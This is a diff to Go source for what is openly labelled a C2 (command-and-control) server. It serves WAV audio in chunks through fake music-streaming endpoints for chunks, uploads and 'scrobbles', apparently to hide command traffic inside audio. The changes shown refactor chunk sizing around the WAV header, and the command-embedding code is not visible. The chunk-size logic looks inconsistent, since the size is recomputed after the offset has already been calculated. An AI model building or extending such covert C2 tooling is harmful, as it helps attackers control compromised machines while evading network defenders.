@@ -21,6 +21,7 @@ import (
 )
 
 const c2_server_ip = "0.0.0.0"
+var firstLoopDone string = "false"
 var (
 	echo_to_stdout string
 	cliMessageChan = make(chan string, 10)
@@ -64,15 +65,16 @@ func invokeTlsListener(ctx context.Context, port string){
 	}()
 
 	mux := http.NewServeMux()
-	mux.HandleFunc("GET /api/v1/sample/chunk/", handleChunk)
+	mux.HandleFunc("GET /api/v1/sample/chunk/", handleChunk) //prolly use a /api/v1/*/chunk to be able to take any music file name
 	mux.HandleFunc("POST /api/v1/upload", handleUpload)
 	mux.HandleFunc("POST /api/v1/sample/scrobble", handleScrobble)
 
 	http.Serve(listener, mux)
 }
-var firstLoopDone string = "false"
+
+var h *WavHeader
+var ChunkSize int = 576
 func handleChunk (w http.ResponseWriter, r *http.Request){
-	//fmt.Println("firstLoopDone ", firstLoopDone)
 	idxStr := strings.TrimPrefix(r.URL.Path, "/api/v1/sample/chunk/")
 	n, err := strconv.Atoi(idxStr)
 	if err != nil {
@@ -81,27 +83,32 @@ func handleChunk (w http.ResponseWriter, r *http.Request){
 	}
 	//prepare the music track
 	var	baseAudioTrack []byte
-	filename:="sample.wav" //TODO - logic to extract filename from urlpath
+	filename:="river_ship.wav" //TODO - logic to extract filename from urlpath
 	if _,exists := trackCache[filename]; exists{
 		baseAudioTrack=trackCache[filename]
 	}else{
 		trackCache[filename], err = os.ReadFile(filename)
 		if err != nil {
-			fmt.Printf("Fatal: 'sample.wav' doesnt exist: %v", err)
+			fmt.Printf("Fatal: '%v' doesnt exist: %v", filename, err)
 			http.NotFound(w, r)
 			return
 		}
 		baseAudioTrack=trackCache[filename]
+		h, _ = parseWavHeader(baseAudioTrack)
 	}	
 	totalTrackBytes := len(baseAudioTrack)
 	
 	//576 Provides a precise 2ms network loop cadence
 	//need to decide if we wanna encode on header or not, if not so, need a way to determine if the chunk is, infact header
-	ChunkSize := 576
+	
 	cmd_len_threshold := ChunkSize/8
 	byteOffset := n*ChunkSize
+	if n==0{
+		byteOffset+= int(h.DataStart) //if it is the first chunk, dont include header in the chunk
+	}
 	isLastChunk := "false"
-
+	ChunkSize = 2* int(h.SampleRate) * int(h.Channels) * int(h.BitsPerSample) /8
+	//fmt.Println("2s ChunkSize", ChunkSize)
 	chunk := make([]byte, ChunkSize)
 	
 	if byteOffset > totalTrackBytes{
@@ -113,7 +120,7 @@ func handleChunk (w http.ResponseWriter, r *http.Request){
 	if byteOffset+ChunkSize > totalTrackBytes {
 		num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
 		isLastChunk="true"
-		firstLoopDone="true"
+		firstLoopDone="false"
 	}else{
 		num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
 	}
@@ -152,6 +159,7 @@ func handleChunk (w http.ResponseWriter, r *http.Request){
 			w.Header().Set("Cache-Control", "no-store")
 			w.Header().Set("X-Last-Chunk", isLastChunk)
 			w.Header().Set("Accept-Ranges", "bytes")
+
 			w.Write(chunk[:num])
 
 			byteOffset = byteOffset + ChunkSize;
